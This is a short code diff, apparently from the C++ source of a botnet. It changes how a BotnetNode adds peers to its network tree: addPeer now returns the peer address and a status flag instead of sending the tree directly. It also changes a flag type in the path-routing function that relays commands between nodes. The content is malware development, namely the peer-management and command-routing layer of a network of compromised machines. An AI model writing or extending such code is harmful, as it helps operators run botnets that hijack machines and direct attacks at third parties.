@@ -50,30 +50,35 @@ void BotnetNode::sendNetTree(
 		node->sendNetTree(udp_sock, peer_addr, hosts, buf);
 }
 
-void BotnetNode::addPeer(
+struct sockaddr_in BotnetNode::addPeer(
 	const u_char* data,
-	const SOCKET& udp_sock
+	BOOL* status
 )
 {
 	/* locals */
-
-	char buffer[1024];
-	std::vector<adr> hosts;
 	struct sockaddr_in peer_addr;
+	std::vector<adr> hosts;
 	const struct botnet_pack* pack = (struct botnet_pack*)data;
 
+	/* 0ing peer_addr struct */
+	ZeroMemory(&peer_addr, sizeof(peer_addr));
+	*status = 0;
+
+	/* if peer is not in the network tree */
 	if (!findNode({ pack->dst_peer.ip, pack->dst_peer.port }, hosts))
 	{
-		/* create sockaddr_in struct */
+		/* create addr struct for peer (for direct communication) */
 		peer_addr.sin_family = AF_INET;
 		peer_addr.sin_port = htons(pack->dst_peer.port);
 		peer_addr.sin_addr.s_addr = htonl(pack->dst_peer.ip);
 
-		hosts.clear();
-		sendNetTree(udp_sock, peer_addr, hosts, buffer);
-
+		/* add to tree */
 		_branches.push_back(new BotnetNode(pack->dst_peer.ip, pack->dst_peer.port));
+		
+		*status = 1; // successful
 	}
+
+	return peer_addr;
 }
 
 BotnetNode* BotnetNode::findNode(
@@ -220,7 +225,7 @@ uint16_t BotnetNode::fowardCommand(
 struct sockaddr_in BotnetNode::nextPathNode(
 	const adr& dest_addr,
 	const adr& private_addr,
-	bool *b_status
+	BOOL *b_status
 )
 {	
 	struct sockaddr_in next_node_addr;
